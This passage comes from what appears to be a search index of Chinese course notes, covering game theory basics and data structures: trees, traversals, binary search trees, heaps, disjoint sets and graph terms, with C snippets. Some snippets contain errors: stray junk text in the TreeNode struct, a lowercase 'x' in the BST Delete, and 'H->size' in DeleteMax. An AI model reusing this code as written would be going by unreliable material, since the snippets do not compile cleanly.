<li>\u53c2\u4e0e\u8005\u91c7\u53d6\u5404\u81ea\u884c\u52a8\u540e\u5f62\u6210\u7684\u72b6\u6001\u79f0\u4e3a\u5c40\u52bf\uff08outcome\uff09\uff0c\u4e0d\u540c\u5c40\u52bf\u4e0b\u5404\u4e2a\u53c2\u4e0e\u8005\u6240\u5f97\u5230\u7684\u5229\u76ca\u6216\u56de\u62a5\u79f0\u4e3a\u535a\u5f08\u7684\u6536\u76ca\uff08payoff\uff09<ul> <li>\u6df7\u5408\u7b56\u7565\u4e0b\u6536\u76ca\u4e3a\u671f\u671b\u6536\u76ca\uff08expected payoff\uff09</li> </ul> </li> <li>\u535a\u5f08\u5206\u7c7b<ul> <li>\u662f\u5426\u5141\u8bb8\u53c2\u4e0e\u8005\u4e4b\u95f4\u5408\u4f5c\uff1a\u5408\u4f5c\u535a\u5f08\uff08cooperative game\uff09\u3001\u975e\u5408\u4f5c\u535a\u5f08\uff08non-\u2026\u2026\uff09</li> <li>\u51b3\u7b56\u65f6\u95f4\uff1a\u9759\u6001\u535a\u5f08\uff08static game\uff09\u3001\u52a8\u6001\u535a\u5f08\uff08dynamic game\uff09<ul> <li>\u9759\u6001\u535a\u5f08\u4e2d\u6240\u6709\u53c2\u4e0e\u8005\u540c\u65f6\u51b3\u7b56\uff0c\u52a8\u6001\u535a\u5f08\u4e2d\u7531\u89c4\u5219\u51b3\u5b9a\u5148\u540e\u4e14\u540e\u8005\u77e5\u9053\u524d\u8005\u7684\u884c\u52a8</li> </ul> </li> <li>\u5bf9\u4fe1\u606f\u7684\u4e86\u89e3\u7a0b\u5ea6\uff1a\u5b8c\u5168\u4fe1\u606f\u535a\u5f08\uff08complete information game\uff09\u3001\u4e0d\u5b8c\u5168\u4fe1\u606f\u535a\u5f08\uff08in-\u2026\u2026\uff09<ul> <li>\u5b8c\u5168\u4fe1\u606f\u535a\u5f08\u4e2d\u6240\u6709\u53c2\u4e0e\u8005\u90fd\u77e5\u9053\u6240\u6709\u4fe1\u606f\uff0c\u4e0d\u5b8c\u5168\u4fe1\u606f\u535a\u5f08\u4e2d\u53c2\u4e0e\u8005\u53ea\u77e5\u9053\u90e8\u5206\u4fe1\u606f</li> <li>\u5b8c\u7f8e\u4fe1\u606f\u535a\u5f08\uff08perfect information game\uff09\uff1a\u53c2\u4e0e\u8005\u77e5\u9053\u6240\u6709\u53c2\u4e0e\u8005\u4e4b\u524d\u91c7\u53d6\u7684\u884c\u52a8</li> </ul> </li> <li>\u603b\u6536\u76ca\uff1a\u96f6\u548c\u535a\u5f08\uff08zero-sum game\uff09\u3001\u975e\u96f6\u548c\u535a\u5f08\uff08non-\u2026\u2026\uff09</li> </ul> </li> <li>\u7eb3\u4ec0\u5747\u8861\uff08Nash equilibrium\uff09\uff1a\u535a\u5f08\u7684\u7a33\u5b9a\u5c40\u52bf<ul> <li>\u7eb3\u4ec0\u5b9a\u7406\uff1a\u82e5\u53c2\u4e0e\u8005\u6709\u9650\uff0c\u6bcf\u4f4d\u53c2\u4e0e\u8005\u91c7\u53d6\u7b56\u7565\u7684\u96c6\u5408\u6709\u9650\uff0c\u6536\u76ca\u51fd\u6570\u4e3a\u5b9e\u503c\u51fd\u6570\uff0c\u5219\u535a\u5f08\u5bf9\u6297\u5fc5\u5b58\u5728\u6df7\u5408\u7b56\u7565\u610f\u4e49\u4e0b\u7684\u7eb3\u4ec0\u5747\u8861</li> <li>\u7b56\u6885\u6d1b\u5b9a\u7406\uff08Zermelo's theorem\uff09\uff1a\u5bf9\u4e8e\u4efb\u610f\u4e00\u4e2a\u6709\u9650\u6b65\u7684\u53cc\u4eba\u5b8c\u5168\u4fe1\u606f\u96f6\u548c\u52a8\u6001\u535a\u5f08\uff0c\u4e00\u5b9a\u5b58\u5728\u5148\u624b\u5fc5\u80dc\u7b56\u7565/\u540e\u624b\u5fc5\u80dc\u7b56\u7565/\u53cc\u65b9\u4fdd\u5e73\u7b56\u7565</li> </ul> </li> </ul>"},{"location":"cs/algorithm/ds/","title":"\u6570\u636e\u7ed3\u6784\u57fa\u7840","text":"<p>Abstract</p> <p>\u6d59\u6c5f\u5927\u5b66 \u201c\u6570\u636e\u7ed3\u6784\u57fa\u7840\u201d \u8bfe\u7a0b\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>\u56fe\u7075\u73ed\u8bfe\u7a0b\u5b66\u4e60\u6307\u5357\uff1a\u6570\u636e\u7ed3\u6784\u57fa\u7840</li> </ul>"},{"location":"cs/algorithm/ds/#table-of-contents","title":"Table of Contents","text":"<ul> <li>\u7b97\u6cd5\u5206\u6790\u57fa\u7840</li> <li>\u603b\u7ed3\uff1a\u57fa\u7840\u6570\u636e\u7ed3\u6784</li> <li>\u603b\u7ed3\uff1a\u6392\u5e8f\u4e0e\u54c8\u5e0c</li> </ul>"},{"location":"cs/algorithm/ds/summary1/","title":"\u57fa\u7840\u6570\u636e\u7ed3\u6784","text":"<p> \u7ea6 3617 \u4e2a\u5b57  154 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 14 \u5206\u949f</p> <p>Abstract</p> <p>\u300c\u6570\u636e\u7ed3\u6784\u57fa\u7840\u300d\u8bfe\u7a0b \u6811\u3001\u5806\u3001\u5e76\u67e5\u96c6\u3001\u56fe \u90e8\u5206\u5185\u5bb9\u590d\u4e60\u4e0e\u603b\u7ed3</p>"},{"location":"cs/algorithm/ds/summary1/#_2","title":"\u6811","text":""},{"location":"cs/algorithm/ds/summary1/#_3","title":"\u57fa\u7840\u6982\u5ff5","text":"<ul> <li>\u6811\u5305\u62ec\u6839\u8282\u70b9\uff08root\uff09\uff0c0 \u4e2a\u6216\u591a\u4e2a\u975e\u7a7a\u5b50\u6811 \\(T_1,\\cdots, T_k\\) \u4e0e\u6839\u901a\u8fc7\u4e00\u6761\u6709\u5411\u8fb9\u8fde\u63a5</li> <li>\u6bcf\u68f5\u5b50\u6811\u7684\u6839\u53eb\u505a root \u7684\u513f\u5b50\uff08children\uff09\uff0croot \u662f\u6bcf\u68f5\u5b50\u6811\u6839\u7684\u7236\u4eb2\uff08parent\uff09</li> <li>\u4e00\u68f5\u6811\u662f \\(N\\) \u4e2a\u8282\u70b9\u548c \\(N-1\\) \u6761\u8fb9\u7684\u96c6\u5408</li> <li>\u6ca1\u6709\u513f\u5b50\u7684\u8282\u70b9\u79f0\u4e3a\u6811\u53f6\uff08leaf\uff09</li> <li>\u6709\u76f8\u540c\u7236\u4eb2\u7684\u8282\u70b9\u79f0\u4e3a\u5144\u5f1f\uff08siblings\uff09</li> <li>\u8282\u70b9\u7684\u513f\u5b50\u6570\u91cf\u79f0\u4e3a\u8fd9\u4e2a\u8282\u70b9\u7684\u5ea6\uff08degree\uff09</li> <li>\u4e00\u68f5\u6811\u7684\u5ea6\u662f\u8fd9\u68f5\u6811\u91cc\u6240\u6709\u8282\u70b9\u5ea6\u7684\u6700\u5927\u503c</li> <li>\u4ece\u8282\u70b9 \\(n_1\\) \u5230 \\(n_k\\) \u7684\u8def\u5f84\u662f\u552f\u4e00\u7684\uff0c\u5176\u957f\u5ea6\u662f\u8def\u5f84\u4e0a\u8fb9\u7684\u6570\u91cf</li> <li>\u5bf9\u4e8e\u8282\u70b9 \\(n_i\\)\uff0c\u5176\u6df1\u5ea6\u4e3a\u4ece\u6839\u5230 \\(n_i\\) \u7684\u552f\u4e00\u8def\u5f84\u7684\u957f\u5ea6</li> <li>\u5bf9\u4e8e\u8282\u70b9 \\(n_i\\)\uff0c\u5176\u9ad8\u5ea6\u4e3a\u4ece \\(n_i\\) \u5230\u4e00\u4e2a\u53f6\u8282\u70b9\u7684\u6700\u957f\u957f\u5ea6</li> <li>\u6839\u7684\u9ad8\u5ea6\u79f0\u4e3a\u8fd9\u68f5\u6811\u7684\u9ad8\u5ea6/\u6df1\u5ea6</li> <li>\u4e00\u4e2a\u8282\u70b9\u7684\u7956\u5148\uff08ancestors\uff09\u662f\u4ece\u6839\u5230\u8fd9\u4e2a\u8282\u70b9\u7684\u8def\u5f84\u4e0a\u7684\u6240\u6709\u8282\u70b9</li> <li>\u4e00\u4e2a\u8282\u70b9\u7684\u540e\u88d4\uff08descendants\uff09\u662f\u8fd9\u4e2a\u8282\u70b9\u5b50\u6811\u4e2d\u7684\u6240\u6709\u8282\u70b9</li> </ul>"},{"location":"cs/algorithm/ds/summary1/#_4","title":"\u6811\u7684\u8868\u793a","text":"<ul> <li>\u5217\u8868\u8868\u793a<ul> <li>\u5b50\u8282\u70b9\u4e2a\u6570\u672a\u77e5\uff0c\u4e0d\u6613\u8868\u793a</li> </ul> </li> <li>FirstChild-NextSibling \u8868\u793a\u6cd5<ul> <li>\u8bb0\u5f55\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\u548c\u4e0b\u4e00\u4e2a\u5144\u5f1f\u8282\u70b9</li> <li>\u56e0\u4e3a\u4e00\u68f5\u6811\u7684\u513f\u5b50\u987a\u5e8f\u4e0d\u5b9a\uff0c\u6240\u4ee5\u4e00\u68f5\u6811\u7684\u8868\u793a\u65b9\u5f0f\u4e0d\u552f\u4e00 <pre><code>struct TreeNode {\n    ElementType Element;\n    PtrToNode FirstChild;\n    PtrToNode NextSibling;FirstChildFirfsads\n};\ntypedef struct TreeNode *PtrToNode;\n</code></pre></li> </ul> </li> </ul>"},{"location":"cs/algorithm/ds/summary1/#_5","title":"\u4e8c\u53c9\u6811","text":"<ul> <li>\u4e8c\u53c9\u6811\uff08binary tree\uff09\u662f\u6bcf\u4e2a\u8282\u70b9\u6700\u591a\u6709\u4e24\u4e2a\u513f\u5b50\u7684\u6811</li> <li>\u6bcf\u68f5\u6811\u90fd\u53ef\u4ee5\u7528\u4e8c\u53c9\u6811\u6765\u8868\u793a<ul> <li>\u5373\u901a\u8fc7 FirstChild-NextSibling \u8868\u793a\u6cd5</li> <li>\u5c06 FirstChild \u89c6\u4e3a\u5de6\u513f\u5b50\uff0cNextSibling \u89c6\u4e3a\u53f3\u513f\u5b50</li> </ul> </li> <li>\u5b8c\u5168\u4e8c\u53c9\u6811\uff08complete binary tree\uff09\u662f\u6240\u6709\u53f6\u8282\u70b9\u90fd\u5728\u76f8\u90bb\u7684\u4e24\u5c42\u4e0a\u7684\u4e8c\u53c9\u6811<ul> <li>\u9664\u4e86\u6700\u540e\u4e00\u5c42\uff0c\u6bcf\u4e00\u5c42\u90fd\u662f\u6ee1\u7684</li> <li>\u6700\u540e\u4e00\u5c42\u7684\u8282\u70b9\u90fd\u9760\u5de6\u6392\u5217</li> </ul> </li> <li>\u7b2c \\(i\\) \u5c42\u7684\u8282\u70b9\u6570\u6700\u591a\u4e3a \\(2^{i-1}\\)</li> <li>\u6df1\u5ea6\u4e3a \\(k\\) \u7684\u4e8c\u53c9\u6811\u6700\u591a\u6709 \\(2^k - 1\\) \u4e2a\u8282\u70b9</li> <li>\\(n_0\\) \u8868\u793a\u53f6\u8282\u70b9\u6570\uff0c\\(n_2\\) \u8868\u793a\u5ea6\u4e3a 2 \u7684\u8282\u70b9\u6570\uff0c\u5219 \\(n_0 = n_2 + 1\\)</li> <li>\u4e8c\u53c9\u6811\u53ef\u4ee5\u901a\u8fc7\u6570\u7ec4\u6765\u8868\u793a<ul> <li>\u6839\u4e3a tree[1]</li> <li>\u8282\u70b9 tree[i] \u7684\u5de6\u513f\u5b50\u4e3a tree[2i]\uff0c\u53f3\u513f\u5b50\u4e3a tree[2i+1]</li> <li>\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u6570\u7ec4\u4e2d\u5143\u7d20\u5168\u90e8\u5206\u5e03\u5728 1 ~ n \u4e2d</li> </ul> </li> <li>\u8868\u8fbe\u5f0f\u6811\uff08expression tree\uff09<ul> <li>\u4e8c\u53c9\u6811\u7684\u4e00\u79cd\uff0c\u6bcf\u4e2a\u8282\u70b9\u90fd\u662f\u4e00\u4e2a\u8fd0\u7b97\u7b26\uff0c\u53f6\u8282\u70b9\u662f\u64cd\u4f5c\u6570</li> <li>\u7528\u4e8e\u8868\u793a\u7b97\u672f\u8868\u8fbe\u5f0f</li> </ul> </li> </ul>"},{"location":"cs/algorithm/ds/summary1/#_6","title":"\u904d\u5386","text":"<ul> <li>\u5148\u5e8f\u904d\u5386\uff08preorder traversal\uff09<ul> <li>\u6839 -&gt; \u5de6 -&gt; \u53f3</li> </ul> </li> <li>\u540e\u5e8f\u904d\u5386\uff08postorder traversal\uff09<ul> <li>\u5de6 -&gt; \u53f3 -&gt; \u6839</li> </ul> </li> <li>\u4e2d\u5e8f\u904d\u5386\uff08inorder traversal\uff09<ul> <li>\u5de6 -&gt; \u6839 -&gt; \u53f3</li> <li>\u53ea\u9002\u7528\u4e8e\u4e8c\u53c9\u6811</li> <li>\u8fed\u4ee3\u5199\u6cd5     <pre><code>void iter_inorder(tree_ptr tree) {\n    Stack S = create_stack();\n    for (;;) {\n        for (; tree; tree = tree-&gt;left)\n            push(S, tree);\n        tree = top(S); pop(S);\n        if (!tree) break;\n        visit(tree-&gt;element);\n        tree = tree-&gt;right;\n    }\n}\n</code></pre></li> </ul> </li> <li>\u5c42\u5e8f\u904d\u5386\uff08level order traversal\uff09<ul> <li>\u4ece\u4e0a\u5230\u4e0b\uff0c\u4ece\u5de6\u5230\u53f3 <pre><code>void levelorder(tree_ptr tree) {\n    enqueue(tree);\n    while (queue is not empty) {\n        visit(T = dequeue());\n        for (each child C of T) \n            enqueue(C);\n    }\n}\n</code></pre></li> </ul> </li> </ul>"},{"location":"cs/algorithm/ds/summary1/#_7","title":"\u7ebf\u7d22\u4e8c\u53c9\u6811","text":"<ul> <li>\u5982\u679c\u4e00\u4e2a\u8282\u70b9\u7684\u5de6\u513f\u5b50\u4e3a\u7a7a\uff0c\u90a3\u4e48\u5b83\u7684\u5de6\u6307\u9488\u6307\u5411\u5b83\u7684\u4e2d\u5e8f\u904d\u5386\u524d\u9a71\u8282\u70b9</li> <li>\u5982\u679c\u4e00\u4e2a\u8282\u70b9\u7684\u53f3\u513f\u5b50\u4e3a\u7a7a\uff0c\u90a3\u4e48\u5b83\u7684\u53f3\u6307\u9488\u6307\u5411\u5b83\u7684\u4e2d\u5e8f\u904d\u5386\u540e\u7ee7\u8282\u70b9</li> <li>\u4e00\u5b9a\u6709\u4e00\u4e2a head node\uff0c\u5de6\u513f\u5b50\u4e3a\u6839\uff0c\u53f3\u513f\u5b50\u4e3a\u81ea\u8eab</li> </ul>"},{"location":"cs/algorithm/ds/summary1/#_8","title":"\u4e8c\u53c9\u641c\u7d22\u6811","text":"<ul> <li>\u4e8c\u53c9\u641c\u7d22\u6811\uff08binary search tree\uff09\u662f\u4e00\u79cd\u4e8c\u53c9\u6811\uff0c\u975e\u7a7a\u60c5\u51b5\u4e0b\u670d\u4ece\u4ee5\u4e0b\u6027\u8d28\uff1a<ul> <li>\u6240\u6709\u8282\u70b9\u90fd\u6709\u4e0d\u540c\u7684 key\uff08\u4e00\u4e2a\u6574\u6570\uff09</li> <li>\u4e00\u4e2a\u8282\u70b9\u7684\u5de6\u5b50\u6811\u7684\u6240\u6709\u8282\u70b9\u7684 key \u90fd\u5c0f\u4e8e\u8fd9\u4e2a\u8282\u70b9\u7684 key</li> <li>\u4e00\u4e2a\u8282\u70b9\u7684\u53f3\u5b50\u6811\u7684\u6240\u6709\u8282\u70b9\u7684 key \u90fd\u5927\u4e8e\u8fd9\u4e2a\u8282\u70b9\u7684 key</li> <li>\u5de6\u5b50\u6811\u548c\u53f3\u5b50\u6811\u4e5f\u90fd\u662f\u4e8c\u53c9\u641c\u7d22\u6811</li> </ul> </li> <li>\u4e8c\u53c9\u641c\u7d22\u6811\u7684\u4e2d\u5e8f\u904d\u5386\u662f\u6709\u5e8f\u7684</li> <li>\u67e5\u627e<ul> <li>\u4ece\u6839\u8282\u70b9\u5f00\u59cb\uff0c\u5982\u679c key \u5c0f\u4e8e\u5f53\u524d\u8282\u70b9\u7684 key\uff0c\u5c31\u5f80\u5de6\u5b50\u6811\u627e\uff0c\u5426\u5219\u5f80\u53f3\u5b50\u6811\u627e</li> <li>\u76f4\u5230\u627e\u5230 key \u76f8\u7b49\u7684\u8282\u70b9\uff0c\u6216\u8005\u627e\u5230\u7a7a\u8282\u70b9</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6 \\(O(h)\\)\uff0c\\(h\\) \u4e3a\u6811\u7684\u9ad8\u5ea6\uff0c\u5373 \\(O(\\log n)\\)</li> </ul> </li> <li>\u67e5\u8be2\u6700\u5c0f\u503c\uff1a\u904d\u5386\u5230\u6700\u5de6\u8fb9\u7684\u8282\u70b9</li> <li>\u67e5\u8be2\u6700\u5927\u503c\uff1a\u904d\u5386\u5230\u6700\u53f3\u8fb9\u7684\u8282\u70b9</li> <li>\u63d2\u5165<ul> <li>\u4ece\u6839\u8282\u70b9\u5f00\u59cb\uff0c\u5982\u679c key \u5c0f\u4e8e\u5f53\u524d\u8282\u70b9\u7684 key\uff0c\u5c31\u5728\u5de6\u5b50\u6811\u9012\u5f52\u63d2\u5165\uff0c\u5927\u4e8e\u5c31\u5728\u53f3\u5b50\u6811\u9012\u5f52\u63d2\u5165</li> <li>\u76f4\u5230\u627e\u5230\u7a7a\u8282\u70b9\uff0c\u7136\u540e\u63d2\u5165</li> <li>\u6216\u8005\u627e\u5230\u76f8\u540c\u7684 key\uff0c\u5ffd\u7565</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6 \\(O(h)\\)\uff0c\\(h\\) \u4e3a\u6811\u7684\u9ad8\u5ea6\uff0c\u5373 \\(O(\\log n)\\)</li> </ul> </li> <li> <p>\u5220\u9664</p> <ul> <li>\u5220\u9664\u53f6\u8282\u70b9\uff1a\u76f4\u63a5\u5220\u9664\u5373\u53ef</li> <li>\u5220\u9664\u53ea\u6709\u4e00\u4e2a\u513f\u5b50\u7684\u8282\u70b9\uff1a\u76f4\u63a5\u5220\u9664\uff0c\u7136\u540e\u628a\u513f\u5b50\u63a5\u4e0a</li> <li>\u5220\u9664\u6709\u4e24\u4e2a\u513f\u5b50\u7684\u8282\u70b9<ul> <li>\u5c06\u8be5\u8282\u70b9\u66ff\u6362\u4e3a\u5de6\u5b50\u6811\u7684\u6700\u5927\u503c\uff0c\u6216\u53f3\u5b50\u6811\u7684\u6700\u5c0f\u503c</li> <li>\u9012\u5f52\u5220\u9664\u5de6\u5b50\u6811\u7684\u6700\u5927\u503c\uff0c\u6216\u53f3\u5b50\u6811\u7684\u6700\u5c0f\u503c</li> </ul> </li> <li>\u4e5f\u53ef\u4ee5\u4f7f\u7528\u61d2\u60f0\u65b9\u6cd5\uff08\u5220\u9664\u4e0d\u591a\u7684\u60c5\u51b5\u4e0b\uff09\uff0c\u4ec5\u627e\u5230\u5e76\u6807\u8bb0\u5220\u9664\uff0c\u8bbf\u95ee\u5230\u65f6\u5ffd\u7565\u8fd9\u4e2a\u8282\u70b9</li> </ul> \u4ee3\u7801 <pre><code>SearchTree Delete(ElementType X, SearchTree T) {\n    Position TmpCell;\n    if (T == NULL) Error(\"not found\");\n    else if (X &lt; T-&gt;Element) T-&gt;Left = Delete(X, T-&gt;Left);\n    else if (x &gt; T-&gt;Element) T-&gt;Right = Delete(X, T-&gt;Right);\n    else {\n        if (T-&gt;Left &amp;&amp; T-&gt;Right) {\n            TmpCell = FindMin(T-&gt;Right);\n            T-&gt;Element = TmpCell-&gt;Element;\n            T-&gt;Right = Delete(T-&gt;Element, T-&gt;Right);\n        } else {\n            TmpCell = T;\n            if (T-&gt;Left == NULL) T = T-&gt;Right;\n            else if (T-&gt;Right == NULL) T = T-&gt;Left;\n            free(TmpCell);\n        }\n    }\n    return T;\n}\n</code></pre> </li> </ul>"},{"location":"cs/algorithm/ds/summary1/#_9","title":"\u5806","text":"<ul> <li>\u5806\uff08heap\uff09\u4e5f\u79f0\u4f5c\u4f18\u5148\u961f\u5217\uff08priority queue\uff09\uff0c\u652f\u6301\u63d2\u5165\u503c\u3001\u627e\u6700\u5c0f/\u5927\u503c\uff0c\u5220\u9664\u6700\u5c0f/\u5927\u503c</li> <li>\u4e8c\u53c9\u5806\uff08binary heap\uff09\u662f\u4e00\u79cd\u5b8c\u5168\u4e8c\u53c9\u6811\uff0c\u6ee1\u8db3\u4ee5\u4e0b\u6027\u8d28\uff1a<ul> <li>\u4efb\u610f\u8282\u70b9\u7684\u503c\u90fd\u4e0d\u5927\u4e8e\uff08\u6216\u4e0d\u5c0f\u4e8e\uff09\u5176\u7236\u8282\u70b9\u7684\u503c\uff08\u5373\u6700\u5927\u5806\u6216\u6700\u5c0f\u5806\uff09</li> </ul> </li> <li>\u63d2\u5165<ul> <li>\u5148\u653e\u5230\u6700\u540e\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u7136\u540e\u548c\u7236\u8282\u70b9\u6bd4\u8f83\uff0c\u4e0d\u6ee1\u8db3\u6761\u4ef6\u5219\u548c\u7236\u8282\u70b9\u4ea4\u6362\uff0c\u76f4\u5230\u6ee1\u8db3 <pre><code>void Insert(ElementType X, MaxHeap H) {\n    if (IsFull(H)) {\n        Error(\"Full Heap\");\n        return;\n    }\n    int i = ++H-&gt;Size;\n    for (; H-&gt;Elements[i/2] &lt; X; i /= 2) {\n        H-&gt;Elements[i] = H-&gt;Elements[i/2];\n    }\n    H-&gt;Elements[i] = X;\n}\n</code></pre></li> </ul> </li> <li>\u5220\u9664<ul> <li>\u5c06\u6700\u540e\u4e00\u4e2a\u53f6\u8282\u70b9\u653e\u5230\u6839\u8282\u70b9\uff0c\u7136\u540e\u548c\u4e24\u4e2a\u513f\u5b50\u6bd4\u8f83\uff0c\u4e0d\u6ee1\u8db3\u5219\u548c\u6700\u5927\uff08\u6216\u6700\u5c0f\uff09\u7684\u513f\u5b50\u4ea4\u6362\uff0c\u76f4\u5230\u6ee1\u8db3 <pre><code>ElementType DeleteMax(MaxHeap H) {\n    if (IsEmpty(H)) {\n        Error(\"Empty Heap\");\n        return H-&gt;Elements[0];\n    }\n    int i, Child;\n    ElementType MaxElement, LastElement;\n    MaxElement = H-&gt;Elements[1];\n    LastElement = H-&gt;Elements[H-&gt;Size--];\n    for (i = 1; i * 2 &lt;= H-&gt;size; i = Child) {\n        Child = i * 2;\n        if (Child != H-&gt;Size &amp;&amp; H-&gt;Elements[Child + 1] &gt; H-&gt;Elements[Child]) {\n            Child++;\n        }\n        if (LastElement &lt; H-&gt;Elements[Child]) {\n            H-&gt;Elements[i] = H-&gt;Elements[Child];\n        } else {\n            break;\n        }\n    }\n    H-&gt;Elements[i] = LastElement;\n    return MaxElement;\n}\n</code></pre></li> </ul> </li> <li>PercolateUp\uff1a\u81ea\u4e0b\u800c\u4e0a\u5806\u5316\uff08\u5373\u8fd9\u4e2a\u5143\u7d20\u53ef\u80fd\u4f1a\u5411\u4e0a\u79fb\u52a8\uff09</li> <li>PercolateDown\uff1a\u81ea\u4e0a\u800c\u4e0b\u5806\u5316\uff08\u5373\u8fd9\u4e2a\u5143\u7d20\u53ef\u80fd\u4f1a\u5411\u4e0b\u79fb\u52a8\uff09</li> <li>\u6709\u4e86 Percolate \u64cd\u4f5c\u53ef\u4ee5\u5b9e\u73b0\u67d0\u4e2a\u5143\u7d20\u7684\u589e\u52a0\u51cf\u5c11\uff0c\u6216\u8005\u5220\u9664\u975e\u6700\u5927\u6700\u5c0f\u7684\u5143\u7d20</li> <li>\u4ece \\(N\\) \u4e2a\u5143\u7d20\u7684\u5e8f\u5217\u4e2d\u6784\u5efa\u4e00\u4e2a\u5806<ul> <li>\u4e00\u4e2a\u4e2a\u63d2\u5165\u9700\u8981 \\(O(N\\log N)\\) \u7684\u590d\u6742\u5ea6</li> <li>\u53ef\u4ee5\u76f4\u63a5\u5c06\u8fd9\u4e2a\u5e8f\u5217\u5f53\u4f5c\u4e8c\u53c9\u6811\uff0c\u7136\u540e\u4ece\u6700\u540e\u4e00\u4e2a\u975e\u53f6\u8282\u70b9\u5f00\u59cb\uff0c\u8fdb\u884c PercolateDown\uff0c\u590d\u6742\u5ea6\u4e3a \\(O(N)\\)</li> </ul> </li> </ul>"},{"location":"cs/algorithm/ds/summary1/#_10","title":"\u5e76\u67e5\u96c6","text":"<ul> <li>\u5e76\u67e5\u96c6\uff08disjoint set\uff09\u662f\u4e00\u79cd\u6570\u636e\u7ed3\u6784\uff0c\u652f\u6301\u4e24\u79cd\u64cd\u4f5c\uff1a<ul> <li>\u5408\u5e76\u4e24\u4e2a\u96c6\u5408</li> <li>\u67e5\u8be2\u4e24\u4e2a\u5143\u7d20\u662f\u5426\u5c5e\u4e8e\u540c\u4e00\u4e2a\u96c6\u5408</li> </ul> </li> <li>\u7528\u6811\uff08\u68ee\u6797\uff09\u7684\u65b9\u5f0f\u8868\u793a\u8fde\u63a5\u60c5\u51b5\uff0c\u4e00\u68f5\u6811\u8868\u793a\u4e00\u4e2a\u96c6\u5408<ul> <li>\u5408\u5e76\u5219\u5c06\u4e00\u68f5\u6811\u7684\u6839\u8282\u70b9\u4f5c\u4e3a\u53e6\u4e00\u68f5\u6811\u7684\u6839\u8282\u70b9\u7684\u513f\u5b50</li> <li>\u67e5\u8be2\u662f\u5426\u5c5e\u4e8e\u540c\u4e00\u4e2a\u96c6\u5408\u5219\u5224\u65ad\u4e24\u4e2a\u5143\u7d20\u7684\u6839\u8282\u70b9\u662f\u5426\u76f8\u540c</li> </ul> </li> <li>\u7528\u6570\u7ec4\u8bb0\u5f55\u5373\u53ef\uff0c\u4f8b\u5982 S[i] \u503c\u8868\u793a i \u8fd9\u4e2a\u8282\u70b9\u7684\u7236\u8282\u70b9</li> <li>\u67e5\u627e\uff1a\u4f9d\u6b21\u6839\u636e\u6570\u7ec4\u503c\u5411\u4e0a\u9012\u5f52\u67e5\u627e\u6839\u8282\u70b9\u5373\u53ef</li> <li>\u5408\u5e76\uff1a\u5148\u67e5\u627e\u4e24\u4e2a\u5143\u7d20\u7684\u6839\u8282\u70b9\uff0c\u7136\u540e\u5c06\u5176\u4e2d\u4e00\u4e2a\u6839\u8282\u70b9\u7684\u7236\u8282\u70b9\u8bbe\u7f6e\u4e3a\u53e6\u4e00\u4e2a\u6839\u8282\u70b9\u5373\u53ef</li> </ul>"},{"location":"cs/algorithm/ds/summary1/#_11","title":"\u6309\u5927\u5c0f\u5408\u5e76","text":"<ul> <li>\u6b63\u5e38\u65b9\u5f0f\u7684\u67e5\u627e\u5408\u5e76\u53ef\u80fd\u4f1a\u9020\u6210\u4e00\u4e2a\u957f\u94fe\u7684\u60c5\u51b5</li> <li>\u6309\u5927\u5c0f\u5408\u5e76\uff08union-by-size\uff09\u59cb\u7ec8\u5c06\u5c0f\u7684\u6811\u5408\u5e76\u5230\u5927\u7684\u6811\u4e0a\uff0c\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u6811\u7684\u9ad8\u5ea6</li> <li>\u8bb0\u5f55\u5219\u5bf9\u4e8e\u6bcf\u4e2a\u6839\uff0c\u53e6 S[root] = -size\uff0csize \u8868\u793a\u8fd9\u4e2a\u6811\u7684\u5927\u5c0f\uff08\u521d\u59cb\u4e3a -1\uff09</li> <li>\u901a\u8fc7\u6309\u5927\u5c0f\u5408\u5e76\u7684\u5e26\u6709 \\(N\\) \u4e2a\u8282\u70b9\u7684\u6811\u6700\u9ad8\u4e3a \\(\\lfloor \\log_2N\\rfloor+1\\)</li> </ul>"},{"location":"cs/algorithm/ds/summary1/#_12","title":"\u8def\u5f84\u538b\u7f29","text":"<p>\u5728\u67e5\u627e\u7684\u540c\u65f6\u5c06\u8def\u5f84\u4e0a\u7684\u6240\u6709\u8282\u70b9\u7684\u7236\u8282\u70b9\u90fd\u8bbe\u7f6e\u4e3a\u6839\u8282\u70b9\uff0c\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u6811\u7684\u9ad8\u5ea6</p> <pre><code>int find(int x) { \n    return ufs[x] == x ? x : ufs[x] = find(ufs[x]);\n}\n</code></pre>"},{"location":"cs/algorithm/ds/summary1/#_13","title":"\u56fe","text":""},{"location":"cs/algorithm/ds/summary1/#_14","title":"\u57fa\u7840\u6982\u5ff5","text":"<ul> <li>\u6709\u9650\u7684\u8fb9\u96c6 \\(E=E(G)\\) \u548c\u70b9\u96c6 \\(V=V(G)\\)</li> <li>\u65e0\u5411\u56fe\uff08undirected graph\uff09\uff1a\u8fb9\u6ca1\u6709\u65b9\u5411</li> <li>\u6709\u5411\u56fe\uff08directed graph\uff09\uff1a\u8fb9\u6709\u65b9\u5411</li> <li>\u4e0d\u8003\u8651\u81ea\u73af\uff08self loop\uff09\u548c\u591a\u91cd\u8fb9\uff08multigraph\uff09</li> <li>\u5b8c\u5168\u56fe\uff08complete graph\uff09\uff1a\u4efb\u610f\u4e24\u4e2a\u70b9\u4e4b\u95f4\u90fd\u6709\u8fb9</li> <li>\\(v_i\\) \u548c \\(v_j\\) \u4e4b\u95f4\u6709\u4e00\u6761\u65e0\u5411\u8fb9\uff0c\u5219\u79f0\uff1a<ul> <li>\\(v_i\\) \u548c \\(v_j\\) \u76f8\u90bb\uff08adjacent\uff09</li> <li>\\((v_i, v_j)\\) is incident on \\(v_i\\) and \\(v_j\\)</li> </ul> </li> <li>\u6709\u4e00\u6761\u4ece \\(v_i\\) \u5230 \\(v_j\\) \u7684\u6709\u5411\u8fb9\uff0c\u5219\u79f0\uff1a<ul> <li>\\(v_i\\) is adjacent to \\(v_j\\)</li> <li>\\(v_j\\) is adjacent from \\(v_i\\)</li> <li>\\(&lt;v_i, v_j&gt;\\) is incident on \\(v_i\\) and \\(v_j\\)</li> </ul> </li> 